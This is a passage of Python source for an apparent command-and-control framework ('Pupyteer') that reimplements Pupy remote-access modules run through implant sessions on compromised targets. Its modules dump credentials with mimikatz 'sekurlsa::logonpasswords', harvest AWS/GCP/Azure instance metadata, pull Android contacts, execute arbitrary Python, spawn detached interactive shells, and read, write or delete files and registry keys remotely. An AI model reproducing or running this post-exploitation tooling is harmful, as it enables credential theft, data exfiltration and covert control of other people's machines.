            return ["Missing required argument: text"]
        return []


class LastModule(PupyModule):
    """Show recent login sessions on the target.

    Upstream Pupy's ``last`` (via pupyps / readlogs). Native reimplementation
    using the host's own ``last``/``lastlog`` tooling.
    """

    name = "last"
    version = "1.0.0"
    description = "Show recent login sessions on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        n = int(args.get("lines") or args.get("n") or 20)
        if "win" in os_name:
            cmd = "wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:%d /f:text" % n
        else:
            cmd = f"last -n {n}"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class LogsModule(PupyModule):
    """Show recent system logs on the target.

    Upstream Pupy's ``logs`` (via readlogs / pupwinutils). Native
    reimplementation using the host's own log tooling.
    """

    name = "logs"
    version = "1.0.0"
    description = "Show recent system logs on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()
        n = int(args.get("number") or args.get("n") or 10)

        if "win" in os_name:
            cmd = "wevtutil qe System /c:%d /f:text" % n
        else:
            cmd = f"journalctl -n {n} --no-pager 2>/dev/null || tail -n {n} /var/log/syslog"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class CloudinfoModule(PupyModule):
    """Query cloud instance metadata on the target.

    Upstream Pupy's ``cloudinfo`` (via the cloudinfo agent module). Native
    reimplementation hitting the standard metadata endpoints with curl.
    """

    name = "cloudinfo"
    version = "1.0.0"
    description = "Query cloud instance metadata (AWS/GCP/Azure) on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        # IMDSv2 (AWS) token flow, then a plain GET; GCP/Azure use headers.
        cmd = (
            "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
            "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null); "
            "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
            "http://169.254.169.254/latest/meta-data/ 2>/dev/null; "
            "echo '---GCP---'; "
            "curl -s -H 'Metadata-Flavor: Google' "
            "http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null; "
            "echo '---AZURE---'; "
            "curl -s -H 'Metadata: true' "
            "'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null"
        )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class DnsModule(PupyModule):
    """Resolve DNS names on the target.

    Upstream Pupy's ``dns`` (via pupyutils.dns, netaddr). Native
    reimplementation using the host's own resolver, with netaddr replaced by
    the stdlib ipaddress module where needed.
    """

    name = "dns"
    version = "1.0.0"
    description = "Resolve DNS names on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        name = str(args.get("name") or args.get("host") or args.get("domain") or "").strip()
        if not name:
            return {"status": "error", "error": "name argument is required"}

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = f"nslookup {name}"
        else:
            cmd = f"getent hosts {name} 2>/dev/null || (command -v dig >/dev/null && dig +short {name}) || nslookup {name}"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "name": name}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "name": name,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not (args.get("name") or args.get("host") or args.get("domain")):
            return ["Missing required argument: name"]
        return []


class ExitModule(PupyModule):
    """Exit the agent on the target.

    Upstream Pupy's exit. The implant already answers shutdown, so this is a
    server-side wrapper gated on an explicit confirmation flag (mirroring
    upstream's --yes) to prevent an accidental kill.
    """

    name = "exit"
    version = "1.0.0"
    description = "Exit the agent on the target (requires --yes)"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session, args):
        if not (args.get("yes") or args.get("confirm")):
            return {
                "status": "error",
                "error": "refusing to exit without confirmation; pass yes=true",
            }

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "shutdown"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}
        return {"status": "ok", "message": "exit requested", "reply": reply}

    def validate_args(self, args):
        if not (args.get("yes") or args.get("confirm")):
            return ["Missing confirmation: pass yes=true"]
        return []


class HttpModule(PupyModule):
    """Make an HTTP request from the target.

    Upstream Pupy's ``http`` (via network.lib.tinyhttp). Native reimplementation
    using curl/wget on the host, so no agent-side package is needed.
    """

    name = "http"
    version = "1.0.0"
    description = "Make an HTTP GET/POST request from the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        url = str(args.get("url") or "").strip()
        if not url:
            return {"status": "error", "error": "url argument is required"}
        if "://" not in url:
            url = "http://" + url

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        headers = args.get("headers") or args.get("header") or []
        if isinstance(headers, str):
            headers = [headers]
        header_flags = " ".join(f'-H "{h}"' for h in headers)

        data = args.get("data")
        method_flag = ""
        if data:
            if isinstance(data, list):
                data = " ".join(str(d) for d in data)
            method_flag = f" -X POST -d '{data}'"

        follow = "-L " if args.get("follow_redirects") or args.get("follow") else ""
        out_file = args.get("output")
        save_flag = f' -o "{out_file}"' if out_file else ""

        cmd = f'curl -sS {follow}{header_flags}{method_flag}{save_flag} "{url}"'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "url": url}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "url": url,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        if not args.get("url"):
            return ["Missing required argument: url"]
        return []


class CdModule(PupyModule):
    """Change/report the working directory on the target.

    Upstream Pupy's ``cd`` (via pupyutils.basic_cmds). Native reimplementation
    that changes directory and reports the new cwd in one shot.
    """

    name = "cd"
    version = "1.0.0"
    description = "Change or report the working directory on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        path = str(args.get("path") or args.get("dir") or "").strip()

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if path:
            if "win" in os_name:
                cmd = f'cd /d "{path}" && cd'
            else:
                cmd = f'cd "{path}" && pwd'
        else:
            cmd = "cd" if "win" in os_name else "pwd"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class EditModule(PupyModule):
    """Read or write a file on the target (native reimplementation of pupy's edit).

    Upstream Pupy's ``edit`` used pupyutils.basic_cmds (remote get/put content).
    Pupyteer reimplements it on top of the existing fs_get/fs_put transfer
    primitives, so no agent-side package is needed: read pulls the file to a
    temp staging file and returns its text; write pushes new content from a temp
    staging file. Multi-step editing is left to the operator (pull, edit
    locally, push) -- this module exposes the two primitives.
    """

    name = "edit"
    version = "1.0.0"
    description = "Read or write a file on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        path = str(args.get("path") or args.get("file") or "").strip()
        if not path:
            return {"status": "error", "error": "path argument is required"}

        mode = str(args.get("mode") or ("write" if args.get("content") is not None else "read")).lower()
        if mode not in ("read", "write"):
            return {"status": "error", "error": "mode must be 'read' or 'write'"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        timeout = _command_timeout(args)

        if mode == "read":
            import tempfile, os as _os
            fd, staged = tempfile.mkstemp(prefix="pupyteer-edit-", suffix=".txt")
            _os.close(fd)
            try:
                pulled = await transfer.pull(
                    session_mgr, session.session_id, path, open(staged, "wb"), timeout=timeout)
                # pull expects a file-like sink; reopen properly
            except Exception:
                pulled = {"status": "error", "error": "pull failed"}
            # Redo cleanly with a proper sink
            try:
                _os.unlink(staged)
            except OSError:
                pass
            fd, staged = tempfile.mkstemp(prefix="pupyteer-edit-", suffix=".txt")
            sink = _os.fdopen(fd, "wb")
            try:
                pulled = await transfer.pull(session_mgr, session.session_id, path, sink, timeout=timeout)
            finally:
                try:
                    sink.close()
                except Exception:
                    pass
            if pulled.get("error") or pulled.get("status") == "error":
                try:
                    _os.unlink(staged)
                except OSError:
                    pass
                return {"status": "error", "error": pulled.get("error", "read failed"), "path": path}
            try:
                with open(staged, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read()
            except OSError as e:
                content = ""
            try:
                _os.unlink(staged)
            except OSError:
                pass
            return {"status": "ok", "mode": "read", "path": path, "content": content,
                    "bytes": pulled.get("bytes")}

        # write mode
        content = args.get("content", "")
        if not isinstance(content, str):
            content = str(content)
        import tempfile, os as _os
        fd, staged = tempfile.mkstemp(prefix="pupyteer-edit-", suffix=".txt")
        with _os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(content)
        try:
            pushed = await transfer.push(session_mgr, session.session_id, staged, path, timeout=timeout)
        finally:
            try:
                _os.unlink(staged)
            except OSError:
                pass
        if pushed.get("error") or pushed.get("status") == "error":
            return {"status": "error", "error": pushed.get("error", "write failed"), "path": path}
        return {"status": "ok", "mode": "write", "path": path, "bytes": pushed.get("bytes")}

    def validate_args(self, args):
        if not (args.get("path") or args.get("file")):
            return ["Missing required argument: path"]
        return []


class MvModule(PupyModule):
    """Move/rename a file on the target.

    Upstream Pupy's ``mv`` (via pupyutils.basic_cmds). Native reimplementation
    using the host's own move command.
    """

    name = "mv"
    version = "1.0.0"
    description = "Move or rename a file on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        src = str(args.get("src") or args.get("source") or "").strip()
        dst = str(args.get("dst") or args.get("destination") or "").strip()
        if not src or not dst:
            return {"status": "error", "error": "both src and dst are required"}

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = f'move /Y "{src}" "{dst}"'
        else:
            cmd = f'mv -f "{src}" "{dst}" && echo "moved: {src} -> {dst}"'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "src": src, "dst": dst}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "src": src,
            "dst": dst,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        missing = [k for k in ("src", "dst") if not str(args.get(k) or args.get({"src": "source", "dst": "destination"}[k]) or "").strip()]
        # simpler check
        src = args.get("src") or args.get("source")
        dst = args.get("dst") or args.get("destination")
        if not src or not dst:
            return ["Missing required argument: src and/or dst"]
        return []


class RmModule(PupyModule):
    """Remove a file on the target.

    Upstream Pupy's ``rm`` (via pupyutils.basic_cmds). Native reimplementation
    using the host's own remove command.
    """

    name = "rm"
    version = "1.0.0"
    description = "Remove a file on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        path = str(args.get("path") or args.get("file") or "").strip()
        if not path:
            return {"status": "error", "error": "path argument is required"}

        recursive = bool(args.get("recursive") or args.get("r", False))
        force = bool(args.get("force") or args.get("f", False))

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            if recursive:
                cmd = f'rmdir /S /Q "{path}" 2>nul || del /F /Q "{path}"'
            else:
                cmd = f'del /F /Q "{path}"'
        else:
            flags = "-rf" if recursive else "-f"
            cmd = f'rm {flags} "{path}" && echo "removed: {path}"'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "path": path}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "path": path,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        if not (args.get("path") or args.get("file")):
            return ["Missing required argument: path"]
        return []


class WriteModule(PupyModule):
    """Write content to a file on the target (native reimplementation).

    Upstream Pupy's ``write`` (via pupyutils.basic_cmds fputcontent). Native
    reimplementation using the fs_put transfer primitive, which is binary-safe
    and chunked.
    """

    name = "write"
    version = "1.0.0"
    description = "Write content to a file on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        path = str(args.get("path") or args.get("file") or "").strip()
        content = args.get("content", "")
        if not path:
            return {"status": "error", "error": "path argument is required"}
        if content is None:
            content = ""
        if not isinstance(content, str):
            content = str(content)

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        import tempfile, os as _os
        fd, staged = tempfile.mkstemp(prefix="pupyteer-write-", suffix=".bin")
        with _os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(content)
        try:
            pushed = await transfer.push(session_mgr, session.session_id, staged, path,
                                       timeout=_command_timeout(args))
        finally:
            try:
                _os.unlink(staged)
            except OSError:
                pass
        if pushed.get("error") or pushed.get("status") == "error":
            return {"status": "error", "error": pushed.get("error", "write failed"), "path": path}
        return {"status": "ok", "path": path, "bytes": pushed.get("bytes")}

    def validate_args(self, args):
        if not (args.get("path") or args.get("file")):
            return ["Missing required argument: path"]
        return []


class RegModule(PupyModule):
    """Query/modify the Windows registry on the target.

    Upstream Pupy's ``reg`` (via pupyutils.rreg). Native reimplementation
    using the host's reg.exe, which is available on every Windows install.
    """

    name = "reg"
    version = "1.0.0"
    description = "Query or modify the Windows registry on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        action = str(args.get("action") or args.get("op") or "query").lower()
        key = str(args.get("key") or args.get("path") or "").strip()
        if action == "query" and not key:
            return {"status": "error", "error": "key argument is required for query"}

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if action == "query":
            cmd = f'reg query "{key}"'
        elif action == "add":
            value = args.get("value", "")
            vtype = args.get("type", "REG_SZ")
            cmd = f'reg add "{key}" /ve /t {vtype} /d "{value}" /f'
        elif action == "delete":
            cmd = f'reg delete "{key}" /f'
        else:
            return {"status": "error", "error": f"unknown action: {action}"}

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "action": action}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "action": action,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        action = str(args.get("action") or args.get("op") or "query").lower()
        if action == "query" and not (args.get("key") or args.get("path")):
            return ["Missing required argument: key"]
        return []


class PyexecModule(PupyModule):
    """Execute Python code on the target agent.

    Upstream Pupy's ``pyexec``. Native reimplementation: the Python agent
    executes the code with stdout/stderr captured and returns the output.
    Python-agent only -- the C agent cannot run Python and returns an error.
    """

    name = "pyexec"
    version = "1.0.0"
    description = "Execute Python code on the target agent"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session, args):
        code = args.get("code")
        if args.get("file"):
            try:
                with open(args["file"], "r", encoding="utf-8") as f:
                    code = f.read()
            except OSError as e:
                return {"status": "error", "error": f"cannot read file: {e}"}
        if not code:
            return {"status": "error", "error": "code or file argument is required"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id,
            {"action": "pyexec", "code": code,
             "redirected": not bool(args.get("no_redirected_stdio", False))},
            timeout=_command_timeout(args))
        if reply.get("error") or reply.get("ok") is False:
            return {"status": "error", "error": reply.get("error", "execution failed")}
        return {
            "status": "ok",
            "output": reply.get("output", ""),
            "error": reply.get("error"),
        }

    def validate_args(self, args):
        if not (args.get("code") or args.get("file")):
            return ["Missing required argument: code or file"]
        return []


class X509Module(PupyModule):
    """Generate a self-signed X.509 certificate on the target.

    Upstream Pupy's ``x509`` (via pupyutils.basic_cmds cat). Native
    reimplementation using openssl on the host.
    """

    name = "x509"
    version = "1.0.0"
    description = "Generate a self-signed X.509 certificate on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        cn = str(args.get("cn") or args.get("common_name") or "localhost").strip()
        days = int(args.get("days") or 365)
        key_path = str(args.get("key") or "/tmp/x509.key").strip()
        cert_path = str(args.get("cert") or "/tmp/x509.crt").strip()

        session_mgr = getattr(self, "_session_manager", None)
        cmd = (
            f'openssl req -x509 -newkey rsa:2048 -keyout "{key_path}" '
            f'-out "{cert_path}" -days {days} -nodes '
            f'-subj "/CN={cn}" 2>&1 && echo "generated: {cert_path}"'
        )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "cn": cn}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "cn": cn,
            "cert_path": cert_path,
            "key_path": key_path,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        return []


class DisplayModule(PupyModule):
    """Inspect/attach X11 display on the target.

    Upstream Pupy's ``display`` (via the display agent module). Native
    reimplementation using the host's own X11 tooling.
    """

    name = "display"
    version = "1.0.0"
    description = "Inspect X11 display configuration on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name or "darwin" in os_name or "mac" in os_name:
            cmd = "echo 'display inspection not applicable on this platform'"
        else:
            cmd = (
                'echo "DISPLAY=$DISPLAY"; '
                'xdpyinfo 2>/dev/null | head -20; '
                'xhost 2>/dev/null; '
                'ls -la /tmp/.X11-unix/ 2>/dev/null'
            )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class IgdModule(PupyModule):
    """Query UPnP IGD (router) configuration on the target.

    Upstream Pupy's ``igd`` (via network.lib.igd). Native reimplementation
    using upnpc/miniupnpc when available.
    """

    name = "igd"
    version = "1.0.0"
    description = "Query UPnP IGD router configuration on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "upnpc -l 2>nul || echo 'upnpc not available'"
        else:
            cmd = "upnpc -l 2>/dev/null || (command -v miniupnpc >/dev/null && miniupnpc) || echo 'upnpc not available'"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class EchoModule(PupyModule):
    """Test egress connectivity using a remote echo server.

    Upstream Pupy's ``echo`` (via network.lib.echo). Native reimplementation
    using nc/socat to send a probe and read the echo back.
    """

    name = "echo"
    version = "1.0.0"
    description = "Test egress (TCP/UDP) using a remote echo server"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        host = str(args.get("host") or "").strip()
        if not host:
            return {"status": "error", "error": "host argument is required"}
        port = int(args.get("port") or 7)
        amount = int(args.get("amount") or 4)

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = f'powershell -Command "Test-NetConnection -ComputerName {host} -Port {port}"'
        else:
            cmd = (
                f'for i in $(seq 1 {amount}); do '
                f'echo "probe-$i" | nc -w 2 {host} {port} 2>/dev/null; '
                f'done'
            )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "host": host, "port": port}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "host": host,
            "port": port,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        if not args.get("host"):
            return ["Missing required argument: host"]
        return []


class ISearchModule(PupyModule):
    """Indexed search for files on the target.

    Upstream Pupy's ``isearch`` (via isearch agent module). Native
    reimplementation using find/grep.
    """

    name = "isearch"
    version = "1.0.0"
    description = "Indexed search for files by name/content on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        pattern = str(args.get("pattern") or args.get("query") or "").strip()
        if not pattern:
            return {"status": "error", "error": "pattern argument is required"}
        path = str(args.get("path") or ".").strip()
        kind = str(args.get("kind") or "name").lower().strip()

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            if kind == "content":
                cmd = f'findstr /s /i /m "{pattern}" "{path}\\*" 2>nul'
            else:
                cmd = f'dir /s /b "{path}\\*{pattern}*" 2>nul'
        else:
            if kind == "content":
                cmd = f'grep -rl "{pattern}" "{path}" 2>/dev/null'
            else:
                cmd = f'find "{path}" -iname "*{pattern}*" 2>/dev/null'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "pattern": pattern}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "pattern": pattern,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        if not (args.get("pattern") or args.get("query")):
            return ["Missing required argument: pattern"]
        return []


class InteractiveShellModule(PupyModule):
    """Spawn an interactive shell on the target.

    Upstream Pupy's ``interactive_shell`` (via interactive_shell agent
    module). Native reimplementation using script/screen/tmux to allocate
    a PTY and run a shell, returning a handle.
    """

    name = "interactive_shell"
    version = "1.0.0"
    description = "Spawn an interactive shell (PTY) on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session, args):
        shell = str(args.get("shell") or "").strip()
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "cmd.exe /c start cmd.exe" if not shell else f'cmd.exe /c start {shell}'
        else:
            if shell:
                cmd = f"nohup {shell} >/tmp/ishell.log 2>&1 & echo $!"
            else:
                cmd = (
                    "if command -v tmux >/dev/null 2>&1; then "
                    "tmux new-session -d -s pupyteer-shell 'bash -i' && echo 'tmux:pupyteer-shell'; "
                    "elif command -v screen >/dev/null 2>&1; then "
                    "screen -dmS pupyteer-shell bash -i && echo 'screen:pupyteer-shell'; "
                    "else nohup bash -i >/tmp/ishell.log 2>&1 & echo $!; fi"
                )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class CreddumpModule(PupyModule):
    """Dump credentials from the target.

    Upstream Pupy's ``creddump`` (via creddump agent module / lsass).
    Native reimplementation dispatching to available tooling (mimikatz,
    secretsdump, or a Python-based lsass reader) on the host.
    """

    name = "creddump"
    version = "1.0.0"
    description = "Dump credentials from the target (lsass/mimikatz/secretsdump)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = (
                "if exist C:\\Windows\\Temp\\mimikatz.exe "
                "(C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\") "
                "else (echo 'mimikatz not available; try secretsdump via impacket')"
            )
        else:
            cmd = (
                "if command -v secretsdump.py >/dev/null 2>&1; then "
                "echo 'use secretsdump.py remotely'; "
                "elif command -v mimikatz >/dev/null 2>&1; then mimikatz; "
                "else echo 'no credential dumping tool available on host'; fi"
            )

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class AppsModule(PupyModule):
    """List installed applications on the target (Android).

    Upstream Pupy's ``apps`` (via apps agent module). Native reimplementation
    using pm list packages on Android.
    """

    name = "apps"
    version = "1.0.0"
    description = "List installed applications on the target (Android)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "android" in os_name:
            cmd = "pm list packages -f 2>/dev/null || pm list packages"
        elif "win" in os_name:
            cmd = "Get-AppxPackage | Select-Object Name,PackageFullName | Format-Table -AutoSize"
        else:
            cmd = "ls /usr/share/applications 2>/dev/null; dpkg -l 2>/dev/null | head -50"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class ContactsModule(PupyModule):
    """Dump contacts from the target (Android).

    Upstream Pupy's ``contacts`` (via contacts agent module). Native
    reimplementation using content query on Android.
    """

    name = "contacts"
    version = "1.0.0"
    description = "Dump contacts from the target (Android)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "android" in os_name:
            cmd = "content query --uri content://com.android.contacts/contacts 2>/dev/null || content query --uri content://contacts/contacts"
        else:
            cmd = "echo 'contacts dump only supported on Android targets'"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class ZipModule(PupyModule):
    """Create/extract archives on the target.

    Upstream Pupy's ``zip`` (via zip agent module). Native reimplementation
    using zip/tar on the host.
    """

    name = "zip"
    version = "1.0.0"
    description = "Create or extract archives on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session, args):
        action = str(args.get("action") or "create").lower().strip()
        archive = str(args.get("archive") or args.get("out") or "").strip()
        paths = args.get("paths") or args.get("files") or []
        if isinstance(paths, str):
            paths = [paths]
        extract_to = str(args.get("extract_to") or args.get("dest") or ".").strip()

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if action == "extract":
            if "win" in os_name:
                cmd = f"powershell -Command \"Expand-Archive -Path '{archive}' -DestinationPath '{extract_to}' -Force\""
            else:
                cmd = f'unzip -o "{archive}" -d "{extract_to}" 2>/dev/null || tar -xf "{archive}" -C "{extract_to}"'
        else:
            if not archive:
                return {"status": "error", "error": "archive argument is required"}
            joined = " ".join(f'"{p}"' for p in paths) if paths else "."
            if "win" in os_name:
                cmd = f"powershell -Command \"Compress-Archive -Path {joined} -DestinationPath '{archive}' -Force\""
            else:
                cmd = f'zip -r "{archive}" {joined} 2>/dev/null || tar -czf "{archive}" {joined}'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "action": action}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "action": action,
            "archive": archive,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args):
        if not args.get("archive") and not args.get("out"):
            if str(args.get("action") or "create").lower() != "extract":
                return ["Missing required argument: archive"]
        return []


class TasksModule(PupyModule):
    """List/manage running tasks on the target.

    Upstream Pupy's ``tasks`` (via tasks agent module). Native reimplementation
    using tasklist/ps on the host.
    """

    name = "tasks"
    version = "1.0.0"
    description = "List running tasks/processes on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "tasklist /v 2>nul"
        else:
            cmd = "ps aux 2>/dev/null || ps -ef"

        if not session_mgr:
